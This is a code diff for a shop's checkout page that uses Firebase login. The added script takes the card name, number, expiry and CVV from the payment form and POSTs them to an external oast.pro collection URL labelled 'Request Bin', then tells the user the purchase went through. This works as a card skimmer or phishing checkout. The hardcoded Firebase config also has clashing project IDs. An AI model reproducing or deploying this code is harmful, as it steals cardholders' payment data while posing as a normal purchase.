@@ -7,36 +7,32 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <!-- HEADER -->
   <header>
     <div class="container">
       <h1>Checkout</h1>
       <nav>
         <ul>
-          <li><a href="shop.html">Shop</a></li>
+          <li><a href="shop.html">Back to Shop</a></li>
           <li><a href="#" id="logoutBtn">Logout</a></li>
         </ul>
       </nav>
     </div>
   </header>
 
-  <!-- CHECKOUT FORM -->
   <section id="checkout" class="section">
     <div class="container">
       <h2>Your Cart</h2>
       <ul id="cartItems"></ul>
       <p id="totalPrice"></p>
 
-      <h2>Payment Info</h2>
+      <h2>Enter Payment Details</h2>
       <form id="checkoutForm">
-        <input type="text" name="name" placeholder="Cardholder Name" required>
+        <input type="text" name="cardName" placeholder="Name on Card" required>
         <input type="text" name="cardNumber" placeholder="Card Number" required>
-        <input type="text" name="expiry" placeholder="MM/YY" required>
-        <input type="text" name="cvc" placeholder="CVC" required>
-        <button type="submit">Submit Payment</button>
+        <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
+        <input type="text" name="cvv" placeholder="CVV" required>
+        <button type="submit">Confirm Purchase</button>
       </form>
-
-      <p id="confirmation" style="color:green; font-weight:bold; margin-top:15px;"></p>
     </div>
   </section>
 
@@ -45,4 +41,74 @@
   </footer>
 
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBL-ESDufxNJZ9H2fU8IywlTaIaWoIjtuQ",
+      authDomain: "badute-5064d.firebaseapp.com",
+      projectId: "badute-594d",
+      storageBucket: "badute-5964d.appspot.com",
+      messagingSenderId: "432684410038",
+      appId: "7cf74922a7fe726ef32e17"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+
+    // Redirect if not logged in
+    onAuthStateChanged(auth, user => {
+      if(!user) window.location.href = "index.html";
+    });
+
+    // Logout button
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      signOut(auth).then(() => window.location.href="index.html");
+    });
+
+    const cartItems = JSON.parse(localStorage.getItem('cart') || '[]');
+    const cartList = document.getElementById('cartItems');
+    const totalPriceEl = document.getElementById('totalPrice');
+
+    if(cartItems.length === 0){
+      cartList.innerHTML = '<li>Your cart is empty.</li>';
+      totalPriceEl.textContent = '';
+    } else {
+      let total = 0;
+      cartItems.forEach(item => {
+        total += item.price;
+        const li = document.createElement('li');
+        li.textContent = `${item.name} - $${item.price}`;
+        cartList.appendChild(li);
+      });
+      totalPriceEl.textContent = `Total: $${total}`;
+    }
+
+    const checkoutForm = document.getElementById('checkoutForm');
+    checkoutForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(checkoutForm);
+      const data = Object.fromEntries(formData.entries());
+      data.cart = cartItems;
+      data.total = cartItems.reduce((sum, i)=>sum+i.price,0);
+
+      // Send to Request Bin
+      const requestBinURL = 'https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro'; // your bin URL
+      try {
+        await fetch(requestBinURL, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify(data)
+        });
+        alert('Purchase submitted! Check your Request Bin.');
+        localStorage.removeItem('cart');
+        window.location.href = 'shop.html';
+      } catch(err) {
+        alert('Failed to submit purchase. Try again.');
+        console.error(err);
+      }
+    });
+
+  </script>
+</body>
+</html>
